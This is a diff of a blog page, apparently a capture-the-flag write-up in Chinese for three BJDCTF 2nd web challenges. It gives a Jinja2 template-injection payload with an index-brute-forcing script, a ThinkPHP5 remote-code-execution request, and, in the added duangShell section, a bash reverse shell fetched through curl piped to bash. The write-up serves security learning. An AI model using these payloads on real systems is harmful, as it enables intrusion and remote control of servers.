@@ -10,20 +10,21 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="#Web经过测试，存在xss和模板注入，这题是模板注入参考文献##">
+  <meta name="description" content="Web  [BJDCTF 2nd]fake google  经过测试，存在xss和模板注入，这题是模板注入参考文献##">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BJD2nd--Web">
 <meta property="og:url" content="http://penson233.github.io/2020/03/24/BJD2nd-Web/index.html">
 <meta property="og:site_name" content="penson.blog">
-<meta property="og:description" content="#Web经过测试，存在xss和模板注入，这题是模板注入参考文献##">
+<meta property="og:description" content="Web  [BJDCTF 2nd]fake google  经过测试，存在xss和模板注入，这题是模板注入参考文献##">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2020032412004079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324120402833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2020032418425620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200324184718643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200324185140132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-24T07:07:45.000Z">
-<meta property="article:modified_time" content="2020-03-24T12:20:17.386Z">
+<meta property="article:modified_time" content="2020-03-24T14:29:33.717Z">
 <meta property="article:author" content="penson">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
@@ -215,7 +216,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">263字</span>
+      <span class="post-count">669字</span>
     </span>
   </span>
 
@@ -224,7 +225,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">3分</span>
     </span>
   </span>
 </div>
@@ -235,21 +236,48 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>#Web<br><img src="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试，存在xss和模板注入，这题是模板注入<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考文献</a><br>##<a id="more"></a></p>
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr>
+<blockquote>
+<p><strong>[BJDCTF 2nd]fake google</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试，存在xss和模板注入，这题是模板注入<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考文献</a><br>##<a id="more"></a></p>
 <p>可以发现是存在这个类的<br><img src="https://img-blog.csdnimg.cn/2020032412004079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来用脚本跑索引</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D;&quot;http:&#x2F;&#x2F;67a8fe61-a3c7-42f4-85ae-f8e301bd7f30.node3.buuoj.cn&#x2F;qaq&quot;</span><br><span class="line">temp&#x3D;&#123;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;537306c0-5737-4a8b-8db5-8fd5c2362b4f.node3.buuoj.cn&#x2F;qaq?name&#x3D;&#123;&#123;\&quot;\&quot;.__class__.__bases__[0].__subclasses__()[%d]&#125;&#125;&quot; % i</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    print (url)</span><br><span class="line">    print(r.text)</span><br><span class="line">    if &quot;os._wrap_close&quot; in r.text:</span><br><span class="line">        print(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
 
 <p>索引是117<br>接下里测试看看能不能命令执行<br>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls &#x2F;&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20200324120402833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功查看根目录下文件，可以发现flag文件在根目录下，查看即可</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324120402833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功查看根目录下文件，可以发现flag文件在根目录下，查看即可<br><br><br><br></p>
 <hr>
-<p>OLD HACKER</p>
+<blockquote>
+<p><strong>[BJDCTF 2nd]old-hack</strong></p>
+</blockquote>
 <p><img src="https://img-blog.csdnimg.cn/2020032418425620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>题目已提示是thinkphp5，自行去搜thinkphp5的漏洞，会找到对应版本，<br><a href="https://www.ebounce.cn/web/thinkphp-rce.html" target="_blank" rel="noopener">参考文献</a></p>
 <p>根据参考文献<br>可得出payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get请求</span><br><span class="line">s&#x3D;captcha</span><br><span class="line">post请求</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200324184718643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看根目录下的flag即可</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324184718643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看根目录下的flag即可<br><br><br><br></p>
+<hr>
+<blockquote>
+<p><strong>[BJDCTF 2nd]duangShell</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200324185140132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>题目已提示是swp备份文件泄露<br>.index.php.swp 即可拿到备份源码<br>vim -r 打开 解析即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>emmmmm，过滤了很多东西，当时做到这无从下手，只能看web了,新知识，反弹shell，在buu上因为内网的原因，这题需要用内网开linux靶机，弄了比较长的时间<br><a href="https://www.cnblogs.com/Konmu/p/12549038.html" target="_blank" rel="noopener">参考文献</a></p>
+<p>因为exec()不会回显（之前一直琢磨怎么让他回显。。。）原来是反弹shell，唉知识面太窄了<br>先在/var/www/html，创建一个shell.txt文件<br>输入的命令为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>ip 为内网主机的ip地址，port为端口，随便输(这里以端口为2333为例)</p>
+<p>再传post值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;内网ip&#x2F;shell.txt|bash</span><br></pre></td></tr></table></figure>
+
+<p>再nc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>学到一个新指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name flag</span><br></pre></td></tr></table></figure>
+
+<p>找到flag所在目录查看即可</p>
 
     
 
@@ -380,7 +408,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a></li></ol>
                     </div>
                 </span>
             </div>
